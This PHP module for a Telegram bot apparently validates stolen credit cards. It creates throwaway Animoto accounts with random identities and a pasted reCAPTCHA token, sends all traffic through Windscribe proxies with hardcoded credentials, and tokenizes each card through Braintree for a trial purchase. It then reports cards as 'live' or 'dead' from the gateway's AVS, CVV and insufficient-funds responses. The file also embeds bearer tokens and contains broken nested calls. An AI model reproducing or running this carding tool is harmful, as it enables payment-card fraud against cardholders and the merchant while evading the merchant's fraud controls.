<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/br ") === 0 || strpos($message, ".br ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yyyy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

##########################################################CHECKER PART#######################################################  

            /////////////////////////////////////////////////////////////////////////////////////
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            ///////////////////////////////////////////////////////////////////////////////////////////////////////
//================[ User Randomization ]================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
//Email
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];

#------[Email Generator]------#

function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();

//
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

#------[Winscribe]------#

$proxy = [
  'socks-us.windscribe.com:1080',
  'socks-nl.windscribe.com:1080',
];

#------[GET]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://animoto.com/pricing');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: animoto.com';
$headers[] = 'method: GET';
$headers[] = 'path: /pricing';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'if-none-match: W/"96bcdea6b446fea0bae5dabdf6fa36fd"';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: none';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get = curl_exec($ch);

#------[GET-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://animoto.com/account/purchase/professional');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: animoto.com';
$headers[] = 'method: GET';
$headers[] = 'path: /account/purchase/professional';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'if-modified-since: Tue, 23 Nov 2021 06:31:00 GMT';
$headers[] = 'referer: https://animoto.com/pricing';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get2 = curl_exec($ch);

//TRIMMING AUTH BEARER
$b3en = trim(strip_tags(getStr($get2, "braintreeToken        : '", "',")));
$b3de = base64_decode($b3en);
$finger = trim(strip_tags(getStr($b3de, '"authorizationFingerprint":"', '"')));

#------[CURL-1]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://animoto.com/appservice/oauth/access_token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: animoto.com';
$headers[] = 'method: POST';
$headers[] = 'path: /appservice/oauth/access_token';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/vnd.animoto-v5+json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/vnd.animoto-v5+json';
$headers[] = 'origin: https://animoto.com';
$headers[] = 'referer: https://animoto.com/account/purchase/professional';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-animoto-accept: application/vnd.animoto-v5+json';
$headers[] = 'x-animoto-authorization: Bearer 30046e47e5a15a5c3a2f12754d1d9155f9e544cf9a6f5fe5a981de40b2407ba9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"grant_type":"https://animoto.com/oauth/grant_types/new_user","user":{"email":"'.$email.'","password":"Moon12#","full_name":"Lucas Noob","user_hints":[{"name":"tos_version","data":"1.6"}],"recaptcha_token":"03AGdBq26_L1zFEtIFJ2tJbmEtovlK5q5JICvCdVq4jCK9wX4CchSV0D-GRHAozJyFUT4zV-kMA5AoMldY4Zm-2aBU71nTyjgEQhpyqaFSZNmxofBriC5ll3Hr6KzQQQmhVODy16yXXj0Kwl-9znfTjgg2iQ6XMQZN-Bqn-OFE_-l1UkG_jEcD0dk2Kdag2Br1hf7TRlr54zAhFhRedhr4UqtSit7qht9wkioncNJG_ITf5K8MnF9mxP-MufFAu-fbCITY0N-ItyUn3bma9bnoEtyQ20EEdOjJGeiedCvA6_At_3g0kpefXGTXwB39pPcGFnFM3ryvJ-7RbtrS5895GqdCJSoRSB8917BGSGoYuY_-Ky8DMY91HORs6RoLAvtiXqdCCySS_uw-cLf1lPSFHZyAJMRcF7wcXQQ0lNDsZpSHw1_1vvxYp0Qc6RhJbAvHMa5TFVpiMdI6","user_demographics":{"user_type":"consumer"},"price_list_logical_id":"57"}}');
$curl01 = curl_exec($ch);
curl_close($ch);


#------[CURL-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://animoto.com/w/update_cart');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: animoto.com';
$headers[] = 'method: POST';
$headers[] = 'path: /w/update_cart';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryzyL346rFLuef3Ics';
$headers[] = 'origin: https://animoto.com';
$headers[] = 'referer: https://animoto.com/account/purchase/professional';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryzyL346rFLuef3Ics
Content-Disposition: form-data; name="price_id"

2873
------WebKitFormBoundaryzyL346rFLuef3Ics
Content-Disposition: form-data; name="project_id"


------WebKitFormBoundaryzyL346rFLuef3Ics
Content-Disposition: form-data; name="render_id"


------WebKitFormBoundaryzyL346rFLuef3Ics
Content-Disposition: form-data; name="country"

IN
------WebKitFormBoundaryzyL346rFLuef3Ics
Content-Disposition: form-data; name="code"


------WebKitFormBoundaryzyL346rFLuef3Ics
Content-Disposition: form-data; name="postal_code"


------WebKitFormBoundaryzyL346rFLuef3Ics
Content-Disposition: form-data; name="region"


------WebKitFormBoundaryzyL346rFLuef3Ics--');
$curl02 = curl_exec($ch);
curl_close($ch);



#------[CURL-3]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://animoto.com/w/update_cart');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: animoto.com';
$headers[] = 'method: POST';
$headers[] = 'path: /w/update_cart';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary2XmpcBIUOrnsP95f';
$headers[] = 'origin: https://animoto.com';
$headers[] = 'referer: https://animoto.com/account/purchase/professional';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary2XmpcBIUOrnsP95f
Content-Disposition: form-data; name="price_id"

2373
------WebKitFormBoundary2XmpcBIUOrnsP95f
Content-Disposition: form-data; name="project_id"


------WebKitFormBoundary2XmpcBIUOrnsP95f
Content-Disposition: form-data; name="render_id"


------WebKitFormBoundary2XmpcBIUOrnsP95f
Content-Disposition: form-data; name="country"

US
------WebKitFormBoundary2XmpcBIUOrnsP95f
Content-Disposition: form-data; name="code"


------WebKitFormBoundary2XmpcBIUOrnsP95f
Content-Disposition: form-data; name="postal_code"

90034
------WebKitFormBoundary2XmpcBIUOrnsP95f
Content-Disposition: form-data; name="region"

New York
------WebKitFormBoundary2XmpcBIUOrnsP95f--');
$curl3 = curl_exec($ch);
curl_close($ch);



//==============[ 1st req ]==============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$finger.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"f1fbb385-24a7-41d4-9947-8457aac91c2a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl1 = curl_exec($ch);
$token = trim(strip_tags(getStr($curl1,'"token":"','"')));
curl_close($ch);
//echo $curl1;

//==============[ 2nd req ]==============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://animoto.com/a/purchases');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: animoto.com';
$headers[] = 'method: POST';
$headers[] = 'path: /a/purchases';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/vnd.animoto-v4+json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/vnd.animoto-v4+json';
$headers[] = 'origin: https://animoto.com';
$headers[] = 'referer: https://animoto.com/account/purchase/professional';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-animoto-accept: application/vnd.animoto-v4+json';
$headers[] = 'x-animoto-authorization: Bearer c46cbe59776fb5ac7e6845f0a238fc4615236ac28c44eb3ac57706d3031ed7a9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);;
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"purchase":{"address":{"country_code_alpha2":"US","first_name":"Lucas","last_name":"Noob","locality":"New York","postal_code":"90034","region":"New York","street_address":"Street 23"},"device_data":"{\"correlation_id\":\"151212a2841be8cf64371e883b95ff15\"}","nonce":"'.$token.'","price_id":2373,"plan_list_logical_id":"10","price_list_logical_id":"57","promotion_code":"","type":"braintree"}}');
$curl2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr_replace($time, '',4);
//echo $curl2;
//echo "<b><i>Response: $curl2</b></i><br>";
//echo "<b><i>Bearer: $b3en</b></i><br>";
//echo "<b><i>Bearer Decoded : $finger</b></i><br>";
if (isset($proxy)){
  $ip = "Proxy live ✅";
  }
  if (empty($proxy)){
  $ip = "Proxy Dead ❌";
  }
  //echo '['.$ip.'] <br>';
  curl_close($ch);
######################END OF CHECKER PART################################################################################
            
            
            if(strpos($curl2, 'Gateway Rejected: avs')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV Matched [AVS Failure] ✅
Response -» Approved (Gateway Rejected:AVS)
Gateway -» Braintree Auth 1
IP -» Proxy ($ip)
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            
            elseif(strpos($curl2, 'Insufficient Funds')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [Credit Floor] ✅
    Response -» Approved (Insufficient Funds)
    Gateway -» Braintree Auth 1
    IP -» Proxy ($ip)
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
              elseif(strpos($curl2, 'Card Issuer Declined CVV')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CCN Matched [CVV2 Failure] ✅
    Response -» Approved (Card Issuer Declined:CVV)
    Gateway -» Braintree Auth 1
    IP -» Proxy ($ip)
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

              else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» $curl2
  Gateway -» Braintree Auth 1
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
            
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>